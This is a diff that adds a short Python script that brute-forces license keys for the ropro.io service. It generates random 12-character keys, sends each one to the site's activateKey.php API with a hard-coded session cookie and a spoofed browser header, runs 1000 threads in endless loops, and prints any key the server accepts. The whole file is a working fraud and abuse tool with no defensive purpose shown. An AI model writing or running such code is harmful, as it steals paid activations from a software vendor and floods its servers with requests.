@@ -1,0 +1,34 @@
+import random, string
+import threading, requests
+
+
+numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
+
+req = requests.Session()
+
+checks = 0
+
+def checkKey(key):
+    global checks
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
+        "Host": "ropro.io"
+    }
+    cookies = {"PHPSESSID": "af4f3dd6b7340cee4ec6eaae56d9399d"}
+    r = req.get(f"https://ropro.io/api/activateKey.php?key={key}", headers=headers, cookies=cookies)
+    checks +=1
+    if r.text == "success":
+        print(key)
+
+def generateKey():
+    while True:
+        result_str = ''.join(str(random.choice(numbers)) for i in range(4)).upper()
+        result_str2 = ''.join(str(random.choice(numbers)) for i in range(4)).upper()
+        result_str3 = ''.join(str(random.choice(numbers)) for i in range(4)).upper()
+        final = f"{result_str}-{result_str2}-{result_str3}"
+        checkKey(final)
+    
+
+
+for x in range(0, 1000):
+    threading.Thread(target=generateKey).start()
